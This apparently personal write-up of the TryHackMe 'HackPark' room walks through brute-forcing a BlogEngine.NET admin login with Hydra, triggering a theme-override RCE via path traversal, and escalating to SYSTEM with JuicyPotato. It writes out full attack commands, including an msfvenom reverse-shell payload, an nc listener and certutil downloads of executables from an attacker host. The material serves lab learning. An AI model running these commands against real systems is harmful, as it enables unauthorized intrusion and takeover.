# THM HackPark

https://tryhackme.com/room/hackpark

A Windows box running **BlogEngine.NET** behind IIS. We brute-force the admin login with **Hydra** (`http-post-form`), abuse a BlogEngine theme-override RCE to get a shell as the `iis apppool\blog` identity, then escalate to SYSTEM with **JuicyPotato** (SeImpersonatePrivilege).

## 2. Initial access — Hydra brute force of the login form

### Capturing the POST request

> **Method:** You have to capture the `POST` request to the login page first, after submitting dummy creds.
> Open Burp Suite > Proxy > Intercept, submit a dummy login, and copy the full request body (the form fields) to paste into Hydra.

![](Pasted%20image%2020261020175715.png)

### Hydra `http-post-form` format

> ```
> hydra -l admin -P /usr/share/wordlists/rockyou.txt \
> 10.49.153.236 http-post-form \
> "/Account/login.aspx<FORM_FIELDS>:F=<FAILURE_TEXT>"
> ```
>
> - `<FORM_FIELDS>` — the full POST body copied from Burp (with `^USER^` / `^PASS^` substituted for the username/password fields).
> - `<FAILURE_TEXT>` — **not** arbitrary text; it is the string that appears on the website when a login attempt fails (e.g. `Login failed`). Hydra checks each attempt for whether that string appears.
> - It is running even if it shows no output.
>
> Example captured `POST` parameter:
> ```

## 3. Foothold — BlogEngine theme-override RCE

We find the BlogEngine version and look it up on Exploit-DB:

https://www.exploit-db.com/exploits/46353

We download and run the file as per the instructions:

```
 * Attack:
 *
 * First, we set the TcpClient address and port within the method below to 
 * our attack host, who has a reverse tcp listener waiting for a connection.
 * Next, we upload this file through the file manager.  In the current (3.3.6)
 * version of BlogEngine, this is done by editing a post and clicking on the 
 * icon that looks like an open file in the toolbar.  Note that this file must
 * be uploaded as PostView.ascx. Once uploaded, the file will be in the
 * /App_Data/files directory off of the document root. The admin page that
 * allows upload is:
 *
 * http://10.10.10.10/admin/app/editor/editpost.cshtml
 *
 *
 * Finally, the vulnerability is triggered by accessing the base URL for the 
 * blog with a theme override specified like so:
 *
 * http://10.10.10.10/?theme=../../App_Data/files
```

Trigger the vulnerability:

```
http://10.49.153.236/?theme=../../App_Data/files

http://10.10.10.10/?theme=../../App_Data/files
```

## 4. Privilege Escalation — JuicyPotato → SYSTEM

Make a reverse shell:

> ==🔵Listener:==
> ```
> rlwrap -cAr nc -lvnp 4444
> ```
>
> ==🔵For 64-bit Windows:==
> ```
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.142.71 LPORT=4444 -f exe -o reverse.exe
> ```

Serve the files from Kali:

```
python3 -m http.server 8000
```

Download JuicyPotato and the reverse shell on the victim:

```
certutil -f -urlcache http://192.168.142.71:8000/JuicyPotato.exe JuicyPotato.exe 
```

```
certutil -f -urlcache http://192.168.142.71:8000/reverse.exe reverse.exe
```

## Lessons Learned

- **ASP.NET login forms carry anti-CSRF tokens (`__VIEWSTATE`, `__EVENTVALIDATION`).** Capture the full POST body in Burp and paste it into Hydra's `http-post-form`, substituting `^USER^`/`^PASS^`.
- **The `:F=<failure text>` (or trailing failure string) must be the real on-page failure message** (e.g. `Login failed`) — Hydra flags a hit when that string is *absent*.
- **Hydra shows no output while running** — be patient; a hit prints at the end.
- **BlogEngine.NET theme-override** lets an authenticated admin drop `PostView.ascx` into `App_Data/files` and execute it via `?theme=../../App_Data/files`.
- **`SeImpersonatePrivilege` on an IIS app-pool = SYSTEM** via JuicyPotato (pass a working CLSID for the OS, `-t *`, `-p` the payload exe).
